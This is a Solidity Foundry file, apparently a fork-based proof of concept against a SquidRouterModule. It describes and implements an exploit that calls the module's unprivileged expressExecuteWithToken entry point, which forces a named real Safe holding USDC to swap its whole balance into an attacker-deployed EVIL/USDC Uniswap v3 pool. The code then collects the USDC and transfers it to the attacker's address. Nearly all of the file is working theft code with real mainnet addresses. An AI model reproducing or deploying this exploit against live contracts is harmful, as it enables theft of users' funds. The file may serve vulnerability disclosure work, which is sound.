// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/ForkPoCBase.sol";

/*
  Hypothesis: SquidRouterModule._executeWithToken trusts any payload the public Squid router carries.

  Reachability: the module is an AxelarExpressExecutableWithToken. Its `expressExecuteWithToken` entry
  runs `_executeWithToken` with a FULLY attacker-chosen (sourceChain, sourceAddress, payload, symbol,
  amount) after only pulling `amount` of the gateway token from the caller. With amount==0 nothing is
  pulled, and the source check `parseAddress(sourceAddress) == squidRouter` is satisfied by simply
  passing the squid router's address string. So any unprivileged caller can invoke
  `_processPayload(token, 0, payload)` -> `_handleActions(safe, delegate, actions)` for ANY safe and any
  delegate address, executing arbitrary supported actions on that safe via execTransactionFromModule.

  Victim: real Safe 0xbfadbd415f574ed8a650b1fffdf16245113be70f (found on-chain via the module's
  ActionExecuted events). At block 25170513 it has the module enabled, holds ~712 USDC, its operator
  delegate 0x352c...a1f3c holds SWAP permission, and it already granted a max, non-expiring Permit2
  allowance for USDC to Universal Router 0x66a9893c. We craft a UNI_V3_SWAP_EXACT_IN action with
  amountOutMin = 0 routing the safe's USDC into a Uniswap v3 pool we own (USDC / EVIL), then reclaim the
  USDC from the pool. The delegate address is only read for the permission check; we never act as it.
*/

interface ISquidModule {
    function expressExecuteWithToken(
        bytes32 commandId,
        string calldata sourceChain,
        string calldata sourceAddress,
        bytes calldata payload,
        string calldata symbol,
        uint256 amount
    ) external payable;
}

interface IERC20X {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IUniV3Factory {
    function createPool(address, address, uint24) external returns (address);
    function getPool(address, address, uint24) external view returns (address);
}

interface IUniV3Pool {
    function initialize(uint160 sqrtPriceX96) external;
    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data)
        external returns (uint256, uint256);
    function burn(int24 tickLower, int24 tickUpper, uint128 amount) external returns (uint256, uint256);
    function collect(address recipient, int24 tickLower, int24 tickUpper, uint128 amount0Max, uint128 amount1Max)
        external returns (uint128, uint128);
}

// ---- action structs, byte-identical to the module's ABI ----
struct ExecuteAction {
    uint8 actionType; // enum ExecuteActionType; UNI_V3_SWAP_EXACT_IN == 2
    bytes encodedData;
}
struct ActionsExecutionParams {
    ExecuteAction[] actions;
    bool isStrict;
}

contract EvilToken {
    string public name = "EVIL";
    string public symbol = "EVIL";
    uint8 public decimals = 6;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 supply) {
        totalSupply = supply;
        balanceOf[msg.sender] = supply;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        uint256 al = allowance[f][msg.sender];
        if (al != type(uint256).max) allowance[f][msg.sender] = al - a;
        balanceOf[f] -= a;
        balanceOf[t] += a;
        return true;
    }
}

contract Exploit {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    uint24 constant FEE = 10000;
    int24 constant TL = 200;
    int24 constant TU = 887200;
    uint160 constant SQRTP_TICK0 = 79228162514264337593543950336; // price 1:1
    uint128 constant L = 1e24;

    address immutable module;
    address immutable safe;
    address immutable delegate;
    address immutable ur1;
    address immutable owner; // attacker EOA; receives the profit

    EvilToken evil;
    address pool;

    constructor(address _module, address _safe, address _delegate, address _ur1) {
        module = _module;
        safe = _safe;
        delegate = _delegate;
        ur1 = _ur1;
        owner = msg.sender;
    }

    function run() external {
        // Deploy EVIL so its address < USDC => EVIL is token0 (single-sided seed uses only token0).
        EvilToken e;
        for (uint256 i = 0; i < 60; i++) {
            e = new EvilToken(1e30);
            if (address(e) < USDC) break;
        }
        require(address(e) < USDC, "ordering");
        evil = e;

        // Attacker-owned Uniswap v3 pool, seeded single-sided with EVIL just above the current price.
        pool = IUniV3Factory(FACTORY).createPool(address(e), USDC, FEE);
        IUniV3Pool(pool).initialize(SQRTP_TICK0);
        IUniV3Pool(pool).mint(address(this), TL, TU, L, "");

        // Force the victim safe to swap ALL its USDC into our pool with amountOutMin = 0.
        uint256 amtIn = IERC20X(USDC).balanceOf(safe);
        bytes memory path = abi.encodePacked(USDC, FEE, address(e)); // tokenIn=USDC -> tokenOut=EVIL
        bytes memory enc = abi.encode(ur1, amtIn, uint256(0), block.timestamp + 3600, path);

        ExecuteAction[] memory acts = new ExecuteAction[](1);
        acts[0] = ExecuteAction({actionType: 2, encodedData: enc}); // UNI_V3_SWAP_EXACT_IN
        ActionsExecutionParams memory p = ActionsExecutionParams({actions: acts, isStrict: true});
        bytes memory payload = abi.encode(module, safe, delegate, p);

        // Unprivileged reach into _executeWithToken: sourceAddress = squid router string; amount = 0.
        ISquidModule(module).expressExecuteWithToken(
            keccak256("quorum-poc"),
            "Polygon",
            "0xce16f69375520ab01377ce7b88f5ba8c48f8d666", // squidRouter, passes the source check
            payload,
            "USDC",
            0
        );

        // Reclaim the victim's USDC that now sits in our pool.
        IUniV3Pool(pool).burn(TL, TU, L);
        IUniV3Pool(pool).collect(address(this), TL, TU, type(uint128).max, type(uint128).max);

        uint256 got = IERC20X(USDC).balanceOf(address(this));
        IERC20X(USDC).transfer(owner, got);
    }

    function uniswapV3MintCallback(uint256 a0, uint256 a1, bytes calldata) external {
        require(msg.sender == pool, "cb");
        if (a0 > 0) evil.transfer(msg.sender, a0);
        if (a1 > 0) IERC20X(USDC).transfer(msg.sender, a1); // expected 0 (single-sided)
    }
}

contract ExploitTest is ForkPoCBase {
    address constant MODULE = 0x1f1d37a3Bf840e35c6a860c7C2dA71Fe555123ca;
    address constant SAFE = 0xBFADBD415f574ed8a650b1fFfDf16245113Be70F;
    address constant DELEGATE = 0x352C6a9f59357457b83D97e33cE28B333a7a1F3c;
    address constant UR1 = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    Exploit exploit;

    function setUp() public {
        forkAt("ethereum", 25170513);
    }

    function test_exploit() public {
        proveTokenProfit(USDC, this.attack);
    }

    function attack() external {
        vm.startPrank(attacker);
        exploit = new Exploit(MODULE, SAFE, DELEGATE, UR1);
        exploit.run();
        vm.stopPrank();
    }
}
